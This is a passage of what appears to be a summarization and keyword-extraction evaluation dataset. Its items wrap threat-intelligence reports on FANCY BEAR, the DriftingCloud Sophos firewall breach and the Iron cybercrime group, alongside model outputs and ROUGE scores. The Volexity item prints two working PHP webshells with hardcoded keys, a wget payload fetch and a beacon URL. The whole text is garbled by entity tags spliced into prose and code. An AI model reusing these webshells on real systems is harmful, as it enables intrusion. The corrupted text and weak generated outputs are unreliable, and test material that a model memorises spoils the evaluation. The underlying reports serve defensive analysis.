[WORK_OF_ART] Fit [WORK_OF_ART] Down [WORK_OF_ART] a [WORK_OF_ART] Rabbit [WORK_OF_ART] Hole ? [ url hole/ ] \" .Categories : Blog , Featured Article , [PERSON] Threat [PERSON] ResearchABOUT THE AUTHORThe ThreatConnect Research Team : is an elite group of globally- acknowledged cybersecurity experts , dedicated to tracking down existing and emerging cyber threats . We scrutinize trends , technology and socio - political motivators to develop comprehensive knowledge of the cyber landscape . Then , we share what we \u2019ve learned so that you can protect your organization , and your team can take precise action against threats .", "generated_text": "War; Russia; FANCY BEAR; tactics; Techniques; procedures; the WADA; WADA-AMA.org; part; these domains; the alert; the WADA; a domain; tas-cass[.]org; the Court of Arbitration for Sport; data; the WADA; April 2016; APT; IoCs; incident; the high-profile Doping scandal; the DOPA; a group; Anonymous Poland; the CAS website; the WADA; the trojanized domain; Na-sass[.]org; fake domains; a network; the Russian government; the website; the cybercriminals; POST; the email address; the domains; Russian; the attacks; the phishing emails; the domains; the analysis; tactics; techniques; procedures; the analysis.", "ref_text": "<START-1>The PDF discusses Russian cyber operations targeting the World Anti-Doping Agency (WADA) and the Court of Arbitration for Sport (CAS) in retaliation for the recommendation to ban all Russian athletes from the 2016 Olympic and Paralympic Games. - In mid-August 2016, WADA alerted stakeholders to phishing emails using spoofed domains that were found to be recently registered by addresses tied to the Russian cyber espionage group FANCY BEAR. - Another domain registered around the same time, tas-cass[.]org, was identified as spoofing CAS's domain. The registration and hosting details of these domains match known FANCY BEAR tactics. - The report suggests FANCY BEAR's operations against WADA and CAS are intended to facilitate Russian intelligence collection and influence operations in response to the recommended athlete ban. - In early August, a hacktivist group Anonymous Poland claimed to have hacked WADA and CAS servers and leaked data. However, Anonymous Poland appears inactive until end of July 2016 and evidence suggests the hackers may actually be of Russian origin. - The report concludes that organizations involved in events with negative implications for Russia can expect to experience cyber operations by Russia facilitating retaliatory influence or propaganda efforts. Knowledge of Russian APT tactics can help defend against such retaliation. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5604395604395606, "gpt3/lexical/rouge_rouge2": 0.2541436464088398, "gpt3/lexical/rouge_rougeL": 0.2802197802197803, "gpt3/lexical/rouge_rougeLsum": 0.2802197802197803, "gpt3_generated_text": ["The article discusses Russian cyber operations, specifically the tactics, techniques, and procedures (TTPs) used by the group known as FANCY BEAR. The World Anti-Doping Agency (WADA) recently alerted stakeholders about phishing emails that used domains spoofing the WADA's legitimate domain. The article highlights that these domains were recently registered and their registration and hosting information are consistent with Russian FANCY BEAR TTPs. The article also mentions another domain, tas-cass[.]org, registered by the same individuals, which spoofs the Court of Arbitration for Sport's (CAS) legitimate domain. The phishing attacks and compromise of Russian athlete Yuliya Stepanova's accounts are believed to be part of targeted activity by Russian actors in response to the whistleblower and the WADA's recommendation to ban all Russian athletes from the Olympic and Paralympic games in Rio de Janeiro. The article concludes by stating that ThreatConnect has alerted WADA and CAS about these findings and shared indicators from this activity."]}, {"split_name": "val", "sample_id": "val_68", "prompt_text": "Extract the keywords: www.volexity.com [PERSON] /blog/2022/06/15 / driftingcloud - zero [DATE] - day - sophos - firewall - exploitation - and - an - insidious - breach/ DriftingCloud : Zero [DATE] - Day [DATE] Sophos [DATE] Firewall [DATE] Exploitation and an [PERSON] Insidious [PERSON] BreachJune [CARDINAL] 15 , 2022by [PERSON] Steven [PERSON] Adair , [PERSON] Thomas [PERSON] Lancaster , [PERSON] Volexity [PERSON] Threat [PERSON] ResearchVolexity frequently works with individuals and organizations heavily targeted by sophisticated , motivated , and well- equipped threat actors from around the world . Some of these individuals or organizations are attacked infrequently or on an irregular basis , while others see a barrage of attacks [DATE] nearly [DATE] every [DATE] week . Regardless of the attack frequency , Volexity keeps its guard up , looking for new and old threats however they manifest themselves . [DATE] Earlier [DATE] this [DATE] year , Volexity detected a sophisticated attack against a customer that is heavily targeted by multiple [NORP] Chinese advanced persistent threat ( [ORG] APT ) groups . This particular attack leveraged a zero [DATE] - day exploit to compromise the customer 's firewall . Volexity observed the attacker implement an interesting webshell backdoor , create a secondary form of persistence , and ultimately launch attacks against the customer 's staff . These attacks aimed to further breach cloud - hosted web servers hosting the organization 's public - facing websites . This type of attack is rare and difficult to detect . This blog post serves to share what highly targeted organizations are up against and ways to defend against attacks of this nature . Note that the vulnerability discussed in this article was resolved by Sophos on [DATE] the [DATE] 25th [DATE] March [DATE] 2022 as indiciated in this advisory . Detecting a Firewall BreachOn [DATE] March 8 , [DATE] 2022 , through its Network Security Monitoring service , Volexity detected anomalous activity emanating from a customer 's [ORG] Sophos [ORG] Firewall . Volexity received alerts from custom signatures it had deployed that immediately put the device under suspicion of being compromised . This led to a forensic investigation where [ORG] Volexity acquired memory , selective files , and disk images from [ORG] the [ORG] Sophos [ORG] Firewall . Analysis of the data led to the discovery of a backdoor on the firewall , as well as evidence of exploitation dating back to [DATE] March [DATE] 5 , [DATE] 2022 . Volexity \u2019s investigation further expanded once it discovered the attacker was using access to the firewall to conduct man - in - the - middle ( MITM ) attacks . The attacker used data collected from these MITM attacks to compromise additional systems outside of the network where the firewall resided . After Volexity \u2019s investigation , Sophos published an advisory on [DATE] March 25 , [DATE] 2022 , describing a remote code execution ( RCE ) vulnerability ( submitted by a [ORDINAL] third - party ) in its firewalls covered by CVE-2022 [ORG] - 1040 . Volexity believes this is the same vulnerability exploited in its investigation , as the customer 's firewall was up to date and met the criteria for remote exploitation . Volexity attributes these attacks to a [NORP] Chinese [ORG] APT group previously reported to [ORG] Volexity [ORG] Threat [ORG] Intelligence customers under the name \" DriftingCloud \" . ( Note : The information in this post was available to [ORG] Volexity [ORG] Threat [ORG] Intelligence customers in TIB-20220408 and TIB-20220429.)In this blog post , Volexity will discuss the following : Actions the attacker took after successfully compromising [ORG] the [ORG] Sophos [ORG] Firewall [ORG] How the attacker used session cookies collected via [ORG] MITM attacks to compromise external systems outside of the network where the firewall resided Webshells and malware installed by the attacker , and actions taken on the external system after successful compromise1/7Recommendations to monitor for similar compromises in your networkAn overview of the attack flow is given below : Breaching the [ORG] FirewallVolexity first identified intrusion activity after detecting suspicious traffic originating from [ORG] the [ORG] Sophos [ORG] Firewall to key systems in its customer \u2019s networks . It was quickly determined the device was likely compromised , and an investigation immediately followed . Volexity [ORDINAL] first collected memory from the device , and later collected a full disk image to assist in its investigation . Volexity suspected the external - facing [ORG] User [ORG] Portal component of [ORG] the [ORG] Sophos [ORG] Firewall might be involved ; it was a likely attack vector given it was the only Internet - exposed component of this network . As a result , Volexity reviewed the web access logs for the device before starting other analysis tasks . These logs revealed significant and repeated suspicious access aimed at a valid [ORG] JSP file ( login.jsp ) , as shown in this sample log entry:[07 / Mar/2022:09:25:58 +0000 ] < redacted > \" POST /userportal / webpages / myaccount / login.jsp HTTP/1.1 \" [CARDINAL] 200 - 0 \" https:// < redacted>/userportal / jlbed / fikds4 / BQ.jsp \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 6.1 ; Win64 ; x64 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [ORG] Gecko ) Chrome/99.0.4844.51 [NORP] Safari/537.36\"These requests show a successful [PRODUCT] HTTP [PRODUCT] 200 status code . However , inspection of the underlying code for \" login.jsp \" did not show any anomalies or modifications that would lead Volexity to believe this file had been backdoored . It should be noted that the file \u201c [PERSON] BQ.jsp \u201d , seen in the [LOC] Referrer field , does not exist as part of [ORG] the [ORG] User [ORG] Portal . At this point , Volexity implemented a plan to set up a packet capture on the device to intercept inbound web requests . The attacker was active when Volexity did this , so it did not take long to capture traffic and confirm this traffic was out of the ordinary . Figure [CARDINAL] 1 . DriftingCloud interacting with a webshell on [ORG] the [ORG] Sophos [ORG] FirewallPrior to capturing network traffic , Volexity captured system memory using [ORG] Volexity [ORG] Surge [ORG] Collect . Data observed from network traffic further aided the investigation of the memory sample . The network traffic combined with analysis of the memory sample proved to be productive for piecing together various aspects of the attacker \u2019s activity.2/7One item identified was the presence of large base64 strings adjacent to suspicious requests made to the [ORG] User [ORG] Portal component of the device ( Figure [CARDINAL] 2 ) similar to those seen in Figure 1.Figure 2 . Example suspicious strings in memoryUsing the adjacent strings as a pivot point , Volexity searched on the firewall \u2019s disk for files containing strings similar to those adjacent to the base64 blobs in memory . In doing so , Volexity identified the following legitimate component of the firewall had been modified by the attacker:/usr / share / webconsole / WEB - INF / classes / cyberoam / sessionmanagement / SessionCheckFilter.classThe investigation revealed the attacker timestomped this file , so its last modify time was the same as other files in this directory . This CLASS file is a legitimate component of [ORG] the [ORG] Sophos [ORG] Firewall . Its purpose is to call SessionCheckHelper with correct parameters based on the current [ORG] URI , which in turn verifies that the user has a valid session ( and if not , it directs them to log in ) . Without reverse - engineering the firewall 's web [ORG] UI , Volexity assumes this helper is called when any request is made to any component of [ORG] the [ORG] Sophos [ORG] Firewall \u2019s portal . The attacker created their own version of this file containing malicious logic . A decompilation of the malicious file using ByteCodeViewer is shown in Figure [CARDINAL] 3.Figure [CARDINAL] 3 . A decompilation of the malicious SessionCheckFilter.class fileIn summary , the malicious code added to SessionCheckFilter.class used the following workflow : Check that the incoming request [ORG] URI or \u201c Accept \u201d HTTP header contains the string \u201c Applicationssid \u201d ; if this fails , proceed with legitimate functionality . Check that the incoming request is a [ORG] POST ; if this fails , proceed with legitimate functionality . If both checks pass , decode the [ORG] POST body using base64 and [ORG] AES using the key \u201c a918c0e8d8153bfc \u201d ; this is likely a partial ( 16 character ) MD5 of a plaintext password used on the attacker 's side . The result of the decode should be another CLASS file which is loaded using SecureClassLoader . This workflow effectively backdoored [ORG] the [ORG] Sophos [ORG] Firewall with a webshell that could be accessed through any URL of the attacker \u2019s choosing . The attacker attempted to blend in by accessing this webshell through requests against the \" login.jsp \" file . At [ORDINAL] first glance , this might appear to be a brute - force login attempt instead of an interaction with a backdoor . The only real elements that appeared out of the ordinary in the log files were the referrer values and the response status codes . CLASS files are compiled and not simply text files , which makes an edit like this not as trivial3/7as with similar webshell cases . It is likely the attacker decompiled the class ( either by retrieving it from the firewall , or from a local firewall used for testing ) , and then created their own version locally before re - compiling it and placing it on the device . Volexity decoded some requests made by the attacker using this webshell and found the attacker was using the publicly available [ORG] BEHINDER framework . It is interesting to note that this is the same framework Volexity believed was leveraged by [CARDINAL] one or more [NORP] Chinese [ORG] APT groups involved in the recent zero [DATE] - day exploitation of [ORG] Confluence [ORG] Servers systems by way of CVE-2022 [LAW] - 26134 . Additional Findings from the [PERSON] FirewallIn addition to this webshell component , Volexity identified several other actions performed by the attacker on [ORG] the [ORG] Sophos [ORG] Firewall that further compromised the victim and ensured persistence . The attacker created [ORG] VPN user accounts and associated certificate pairs on the firewall to facilitate legitimate remote network access . As part of the exploitation of [ORG] the [ORG] Sophos [ORG] Firewall , the attacker wrote and executed a file on disk at the following path:/conf / certificate / pre_install.shWhen executed , the \" pre_install.sh \" file runs a malicious command to download a binary , execute it , then delete it from disk . At the time of analysis , the binary was absent from the command - and - control ( C2 ) server , and it was not present in memory or on disk . This file did not appear to be a legitimate component of the firewall . Moving Beyond the [ORG] FirewallWhile gaining access to the target 's [ORG] Sophos [ORG] Firewall was likely a primary objective , it appears this was not the attacker 's only objective . Volexity discovered that the attacker used their access to the firewall to modify [ORG] DNS responses for specially targeted websites in order to perform [LOC] MITM attacks . The modified [ORG] DNS responses were for hostnames that belonged to the victim organization and for which they administered and managed the content . This allowed the attacker to intercept user credentials and session cookies from administrative access to the websites ' content management system ( [ORG] CMS ) . Volexity determined that in multiple cases , the attacker was able to access the [ORG] CMS admin pages of the victim organization 's websites with valid session cookies they had hijacked . The log snippet below shows the [ORDINAL] first interaction with a victim web domain by the attacker:172.x.x.x - - - - [ [CARDINAL] 16 / Mar/2022:08:19:57 +0000 ] \" target.tld \" \" GET /wp - admin/ HTTP/1.1 \" [PRODUCT] 200 46067 \" - \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" 103.76.xx.xx\"Using these session cookies , the attacker was able to directly access the [ORG] WordPress admin panel without sending a username and password , and they accessed a page that allows installation of additional plugins:172.x.x.x- - - - [ [CARDINAL] 16 / Mar/2022:08:22:04 +0000 ] \" target.tld \" \" GET /wp - admin / plugins.php HTTP/1.1 \" 200 42941 \" url \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" 103.76.xx.xx \u201d 172.x.x.x - - - - [ 16 / Mar/2022:08:22:07 +0000 ] \" target.tld \" \" GET /wp - admin / plugin - install.php HTTP/1.1 \" [CARDINAL] 200 41547 \" url \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" 103.76.xx.xx\"The attacker then searched for the File Manager plugin and installed it . This plugin can be used to perform file management tasks on the website , such as uploading , downloading , editing , or deleting a file:172.x.x.x - - - - [ [CARDINAL] 16 / Mar/2022:08:26:21 +0000 ] \" target.tld \" \" GET /wp - admin / plugins.php ? _ wpnonce=13241af34c&action = activate&plugin = wp - file - manager / file_folder_manager.php HTTP/1.1 \" [CARDINAL] 302 0 \" url \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" [CARDINAL] 103.76.x.x \" 172.x.x.x - - - - [ [CARDINAL] 16 / Mar/2022:08:26:22 +0000 ] \" target.tld \" \" GET /wp - admin / plugins.php ? activate = true&plugin_status = all&paged=1&s= HTTP/1.1 \" [CARDINAL] 200 43523 \" url install.php?s=file%20manager&tab=search&type=term \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" [CARDINAL] 103.76.x.x \" 172.x.x.x - - - - [ [CARDINAL] 16 / Mar/2022:08:26:43 +0000 ] \" target.tld \" \" GET /wp - admin / admin.php ? page = wp_file_manager HTTP/1.1 \" [CARDINAL] 200 [CARDINAL] 37492 \" url \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" 103.76.x.x\"Having successfully installed the [ORG] File Manager plugin , the attacker used it to upload a [ORG] PHP file , placing it in the [DATE] March [DATE] 2022 [ORG] WordPress uploads directory:172.x.x.x - - - - [ [CARDINAL] 16 / Mar/2022:08:29:16 +0000 ] \" target.tld \" \" GET /wp - admin / admin - ajax.php ? action = [CARDINAL] mk_file_folder_manager&_wpnonce=1fead1b621&networkhref=&cmd = ls&target = l1_d3AtY29udGXteC71cGxvYWRzLzIwMjEvM < redacted>.php&reqid=1b191dc2be41a2 HTTP/1.1 \" [CARDINAL] 200 [CARDINAL] 11 \" url /wp - admin / admin.php?4/7page = wp_file_manager \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" 103.76.xx.xx\"Finally , the attacker deactivated the [ORG] File Manager [PERSON] plugin:172.x.x.x [PERSON] - [PERSON] - [PERSON] - [PERSON] - [PERSON] [ [CARDINAL] 16 / Mar/2022:08:32:01 +0000 ] \" target.tld \" \" GET /wp - admin / plugins.php ? action = deactivate&plugin = wp - file- [ORG] manager%2Ffile_folder_manager.php&plugin_status = all&paged=1&s&_wpnonce = bc1ca29a43 HTTP/1.1 \" [CARDINAL] 302 0 \" url \" \" [WORK_OF_ART] Mozilla/5.0 ( Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:97.0 ) Gecko/20100101 Firefox/97.0 \" \" 103.76.xx.xx\"The webshell was fairly short and consisted of the following [ORG] PHP code , which appears to be a variation on the [GPE] Weevely webshell:<?php $ [MONEY] J='Ktch(\"/K$kh(.+K)K$kf/\",@fileK_get_contents(\"pKhpK://inpuKt\"K),$m ) ' ; $ [MONEY] e='==1 ) { @oKb_stKart();@eKval(K@gzuncKomprKess(@x(@bKase64_KdecKode (; $ P = str_replace('VG','','cVGreaVGtVGVGe_fVGunVGction ' ) ; $ [MONEY] l='$k=\"1506aKdbd\";$Kkh=\"7eKfK1ee10Kd884\";$kf=\"9K82K58e20d7a0\"K ; ' ; $ [MONEY] C='K$p=\"Kwton3r3P7tKKHoi9Uk\";functioKn Kx($Kt,$k){$c = [GPE] stKKrlen($k)KK;$l = s ' ; $ B='trlen(K$t);$oK=\"\";for($iK = [GPE] K0;$i<$lK;){for($jK = [GPE] K0;($j<$cK&&$i ' ; $ [MONEY] X='r=@bKase64_enKcode(K@x(@gzcoKmpKKrKess($o),$k));printK(\"$p$kKh$r$kf \" ) ; } ' ; $ W='m[1K]),K$k)));$KKo=@ob_get_contKentKs();@ob_KendK_clean()K;$y='<$l);$j++K,$i++K)K{$o . K=$t{$i}^$Kk{$j};}}reKturn [PERSON] K$oK;}if ( [ORG] @pregKK_ma ' ; $ a = str_replace('K','',$l.$C.$B.$y.$J.$e.$W.$X ) ; $ S=$P('',$a);$S ( ) ; ? > This is a simple shell that reads the file input , base64 decodes it , decompresses it , and then runs an eval ( ) on the resulting [ORG] PHP statement . Evidently this was not the attacker 's preferred shell , however , as they quickly installed a [ORDINAL] second shell with a name based on an existing [ORG] PHP file . This is a popular webshell that appears to go by many names , including [ORG] IceScorpion , and has the following contents:<?php $ key=\"aece158[snipped ] \" ; //32md516\uff0crebeyond $ _ SESSION['k']=$key ; session_write_close ( ) ; $ post = file_get_contents(\"php://input \" ) ; if(!extension_loaded('openssl ' ) ) { $ t=\"base64_\" . \"decode \" ; $ post=$t($post . \" \" ) ; for($i=0;$i < strlen($post);$i++ ) { $ [MONEY] post[$i ] = $ post[$i]^$key[$i+1&15 ] ; $ post = openssl_decrypt($post , \" AES128 \" , $ key ) ; } $ arr = explode('|',$post ) ; $ func=$arr[0 ] ; $ params=$arr[1 ] ; class C{public function _ _ invoke($p ) { eval($p . \" \" ) ; } } [ORG] @call_user_func(new [ORG] C(),$params ) ; ? > This has similar functionality but uses [ORG] AES128 encryption with a hardcoded password \u201c aece158afa2f0f49 \u201d . This is the main shell that the attacker used in subsequent exploitation . Based on both PCAPs relating to this shell , other logs on the system , and analysis of the memory image using [PERSON] Volexity [PERSON] Volcano , Volexity was able to piece together a number of commands issued by the attacker . Some interesting observations are provided below : The attacker cloned a [ORG] GitHub repository for CVE-2021 [ORG] - 4034 in an attempt to escalate their privileges . After this did not work , the attacker downloaded a custom implementation of the shared object ( db.py ) of the same exploit from a [GPE] Github page owned by the attacker ( which has since been taken down ) .5/7Figure [CARDINAL] 4 . \" Gooogleapis \" GitHub user and repository containing tools related to compromise of [PRODUCT] Sophos [PRODUCT] Firewall devicesThe same [ORG] GitHub page also included a Sliver binary named \u201c kstrp \u201d . Volexity did not observe this specific file on an infected system or in any command . This could suggest that the same repository was used in operations against other targets . The attacker also downloaded another file via wget which is believed to have been another attempt at privilege escalation on the web server . This file appears to have been an attempt to exploit CVE-2021-4034.wget url -O /tmp / x.pyThe attacker used their access to this webserver to install [CARDINAL] three open - source malware families , including PupyRAT , [GPE] Pantegana and Sliver . Volexity did not find anything too remarkable about the usage and deployment of these backdoors . However , Volexity did find the server - side configuration for the [GPE] Pantegana malware to be worth noting : the attacker attempted to operate as \u201c The SWAG \u201d via \u201c SWAG , Inc. \u201d . This looks to be a custom implementation , as it was found to differ from the default certificate . Figure [CARDINAL] 5 . Customised SSL certificate leveraged by the [GPE] Pantegana malware , shown in [ORG] BinaryEdge ConclusionDriftingCloud is an effective , well equipped , and persistent threat actor targeting [CARDINAL] five - poisons - related targets . They are able to develop or purchase zero [DATE] - day exploits to achieve their goals , tipping the scales in their favor when it comes to gaining entry to target networks . It is critical for organizations that support or consist of targeted groups to have network monitoring solutions in place in order to identify compromises when they inevitably occur . Compromise of gateway devices is a frequent root cause for incidents investigated by Volexity , and compromising them often gives attackers a lead on defenders who are often focused on endpoint and [ORG] EDR solutions which are not present on these devices . Sophos has published advice on mitigating this vulnerability in their advisory . Specifically , the advisory states the following:\"Sophos has observed this vulnerability being used to target a small set of specific organizations primarily in the [LOC] South [LOC] Asia region . We have informed each of these organizations directly . Sophos will provide further details as we6/7continue to investigate . There is no action required for [ORG] Sophos [ORG] Firewall customers with the \" Allow automatic installation of hotfixes \" feature enabled . Enabled is the default setting . \"To generically identify similar attacks to those discussed , Volexity recommends the following : Deploy network security monitoring and other mechanisms to detect and record traffic from gateway devices . For Unix - based webservers , consider using auditd to enable easier investigation in the event of compromise . Ask vendors of perimeter devices ( such as firewalls ) what capabilities they have to detect a compromise , and what methods would be available for you to investigate a compromise if one were to occur . Some vendors do not allow access to perimeter devices which can complicate investigations of suspected compromise . To prevent these specific attacks from being successful , Volexity recommends the following : Use the [ORG] YARA rules listed on [PERSON] GitHub here to identify suspicious related activity . Block the IOCs listed on [PERSON] GitHub here . Related Indicatorsakamprod[.]com u2d.servusers[.]com servusers[.]com googleanalytics.proxydns[.]com", "generated_text": "Chinese advanced persistent threat; APT; a zero-day exploit; a customer; the Firewall; access; the attacker; access; MITM attacks; additional systems; the network; the firewall; the backdoor; persistence; persistence; the attacker; a remote code execution; a Vulnerabilities vulnerability; Sophos; CVE-2022-1040; a remote code execution; exploits; the victim; the attacker; EXEs; the victim; services; a backdoor; persistence; a system; a website; compromise; a firewall; this type; attacks; a variety; techniques; Attackers; threat actors.", "ref_text": "<START-1>The PDF describes research by Volexity into a sophisticated cyberattack campaign targeting organizations of interest to Chinese threat actors. The attackers exploited a zero-day vulnerability in Sophos firewall devices to gain initial access. Volexity detected the intrusion through anomaly detection and forensic investigation of the compromised firewall. The attackers had installed a malicious Java class file to create a backdoor on the firewall's web interface. This provided persistent access using the publicly available BEHINDER webshell framework. The attackers then performed man-in-the-middle attacks to intercept credentials and cookies for externally hosted websites belonging to the victim organization. They leveraged the stolen cookies to remotely access the website's admin console and install PHP webshells for further access. Web server compromise was used to install backdoors like PupyRAT, Pantegana, and Sliver. Privilege escalation attempts were also observed. The campaign exhibits sophistication through exploitation of a zero-day vulnerability, custom webshells, and operational security measures. Volexity attributes the activity to a Chinese threat actor group they track as DriftingCloud based on TTPs. The incident highlights risks of gateway device compromise and need for network monitoring to detect advanced persistent threat activity. Recommendations are provided for detection and prevention of similar attacks. In summary, the report analyzes an advanced cyberespionage campaign that combined a firewall zero-day exploit with strategic web server compromises to gain access and persist within a targeted organization's network. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4425287356321839, "gpt3/lexical/rouge_rouge2": 0.09826589595375725, "gpt3/lexical/rouge_rougeL": 0.22413793103448273, "gpt3/lexical/rouge_rougeLsum": 0.22413793103448273, "gpt3_generated_text": ["This article discusses a sophisticated attack that targeted a customer heavily targeted by Chinese advanced persistent threat (APT) groups. The attackers leveraged a zero-day exploit to compromise the customer's Sophos Firewall, and then implemented a webshell backdoor and additional persistence methods. The attackers also conducted man-in-the-middle (MITM) attacks using data collected from the firewall to compromise external systems. The vulnerability exploited in the attack was later resolved by Sophos. The article provides recommendations for monitoring similar compromises and highlights the techniques used by the attackers. Overall, the article sheds light on the tactics used by threat actors and the importance of staying vigilant against these types of attacks."]}, {"split_name": "val", "sample_id": "val_69", "prompt_text": "Extract the keywords: [ORG] HomeProducts [ORG] & [ORG] ServicesTechnologyCompanyBlogResourcesTry it nowBlog [ORG] Cybersecurity [ORG] DNAIron [ORG] Cybercrime [ORG] Group Under The ScopePDFmyURL converts any url to pdf!Omri Ben Bassat [CARDINAL] 29.05.18 | 11:53 amShare : In [DATE] April [DATE] 2018 , while monitoring public data feeds , we noticed an interesting and previously unknown backdoor using [ORG] HackingTeam \u2019s leaked [ORG] RCS source code . We discovered that this backdoor was developed by the [ORG] Iron cybercrime group , the same group behind the [ORG] Iron ransomware ( rip - off Maktub ransomware recently discovered by [PERSON] Bart [PERSON] Parys ) , which we believe has been active for [DATE] the [DATE] past [DATE] 18 [DATE] months . During [DATE] the [DATE] past [DATE] year [DATE] and [DATE] a [DATE] half , the [ORG] Iron group has developed multiple types of malware ( backdoors , crypto - miners , and ransomware ) for Windows , Linux and [ORG] Android platforms . They have used their malware to successfully infect , at least , [CARDINAL] a [CARDINAL] few [CARDINAL] thousand victims . In this technical blog post we are going to take a look at the malware samples found during the research . Technical Analysis : Installer :* * This installer sample ( and in general most of the samples found ) is protected with [ORG] VMProtect then compressed using UPX.Installation process : [CARDINAL] 1 . Check if the binary is executed on a VM , if so \u2013 ExitProcess2 . [ORG] Drop [ORG] & [ORG] Install malicious chrome extension % localappdata%\\Temp\\chrome.crx [CARDINAL] 3 . Extract malicious chrome extension to % localappdata%\\Temp\\chrome [ORG] & create a scheduled task to execute % localappdata%\\Temp\\chrome\\sec.vbs . [CARDINAL] 4 . Create mutex using the CPU \u2019s version to make sure there \u2019s no existing running instance of itself . [CARDINAL] 5 . Drop backdoor dll to % localappdata%\\Temp\\\\<random>.dat . [CARDINAL] 6 . Check OS version : PDFmyURL converts any url to pdf!.If Version = = Windows XP then just invoke \u2018 Launch \u2019 export of [PERSON] Iron [PERSON] Backdoor for a [CARDINAL] one - time non persistent execution . .If Version > Windows XP -Invoke \u2018 Launch \u2019 export -Check if Qhioo360 \u2013 only if not proceed , Install malicious certificate used to sign [PERSON] Iron [PERSON] Backdoor binary as root CA.Then create a service called \u2018 helpsvc \u2019 pointing back to [PERSON] Iron [PERSON] Backdoor dll . PDFmyURL converts any url to pdf!Using the leaked [ORG] HackingTeam source code : Once we Analyzed the backdoor sample , we immediately noticed it \u2019s partially based on [ORG] HackingTeam \u2019s source code for their Remote Control System hacking tool , which leaked [DATE] about [DATE] 3 [DATE] years [DATE] ago . Further analysis showed that the [ORG] Iron cybercrime group used [CARDINAL] two main functions from [ORG] HackingTeam \u2019s source in both [ORG] IronStealer and [ORG] IronPDFmyURL converts any url to pdf!ransomware.1.Anti - VM : [PERSON] Iron [PERSON] Backdoor uses a virtual machine detection code taken directly from [ORG] HackingTeam \u2019s \u201c Soldier \u201d implant leaked source code . This piece of code supports detecting [PERSON] Cuckoo [PERSON] Sandbox , [ORG] VMWare product & Oracle \u2019s [PRODUCT] VirtualBox . Screenshot:2 . Dynamic Function Calls : [PERSON] Iron [PERSON] Backdoor is also using the [ORG] DynamicCall module from [ORG] HackingTeam \u2019s \u201c core \u201d library . This module is used to dynamically call external library function by obfuscated the function name , which makes static analysis of this malware more complex . In the following screenshot you can see obfuscated \u201c LFSOFM43 / EMM \u201d and \u201c DsfbufGjmfNbqqjohB \u201d , which represents \u201c kernel32.dll \u201d and \u201c CreateFileMappingA \u201d API.PDFmyURL converts any url to pdf!For a full list of obfuscated APIs you can visit obfuscated_calls.h . Malicious Chrome extension : A patched version of the popular [ORG] Adblock [ORG] Plus chrome extension is used to inject both the in - browser crypto - mining module ( based on [ORG] CryptoNoter ) and the in - browser payment hijacking module.**patched include.preload.js injects [CARDINAL] two malicious scripts from the attacker \u2019s Pastebin account . The malicious extension is not only loaded once the user opens the browser , but also constantly runs in the background , acting as a stealth host based crypto - miner . The malware sets up a scheduled task that checks if chrome is already running , [TIME] every [TIME] minute , if it is n\u2019t , it will \u201c silent - launch \u201d it as you can see in the following screenshot : PDFmyURL converts any url to pdf!Internet [PERSON] Explorer(deprecated):Iron [PERSON] Backdoor itself embeds adblockplusie [ORG] \u2013 [ORG] Adblock [ORG] Plus [ORG] for [ORG] IE , which is modified in a similar way to the malicious chrome extension , injecting remote javascript . It seems that this functionality is no longer automatically used for some unknown reason . Persistence : Before installing itself as a Windows service , the malware checks for the presence of either [CARDINAL] 360 Safe Guard or 360 Internet Security by reading following registry keys:.SYSTEM\\CurrentControlSet\\Services\\zhudongfangyu . .SYSTEM\\CurrentControlSet\\Services\\360rpIf [CARDINAL] one of these products is installed , the malware will only run once without persistence . Otherwise , the malware will proceed to installing rouge , hardcoded root CA certificate on the victim \u2019s workstation . This fake root CA supposedly signed the malware \u2019s binaries , which will make them look legitimate . Comic break : The certificate is protected by the password \u2018 caonima123 \u2019 , which means \u201c f*ck your mom \u201d in [LANGUAGE] Mandarin . IronStealer ( < RANDOM>.dat ): Persistent backdoor , dropper and cryptocurrency theft module.1 . Load Cobalt Strike beacon : The malware automatically decrypts hard coded shellcode stage-1 , which in turn loads [PRODUCT] Cobalt [PRODUCT] Strike beacon in - memory , using a reflective loader : PDFmyURL converts any url to pdf!Beacon : hxxp://dazqc4f140wtl.cloudfront[.]net / ZZYO2 . [ORG] Drop [ORG] & [ORG] Execute payload : The payload URL is fetched from a hardcoded Pastebin paste address : We observed [CARDINAL] two different payloads dropped by the malware:1 . Xagent \u2013 A variant of \u201c [WORK_OF_ART] JbossMiner [WORK_OF_ART] Mining [WORK_OF_ART] Worm \u201d \u2013 a worm written in Python and compiled using [PERSON] PyInstaller for both Windows and Linux platforms . [ORG] JbossMiner is using known database vulnerabilities to spread . \u201c Xagent \u201d is the original filename [PERSON] Xagent < [PERSON] VER>.exe whereas < VER > seems to be the version of the worm . The last version observed was version [CARDINAL] 6 ( Xagent6.exe).PDFmyURL converts any url to pdf!**Xagent versions [CARDINAL] 4 - 6 as seen by VT2 . Iron ransomware \u2013 We recently saw a shift from dropping [PERSON] Xagent to dropping 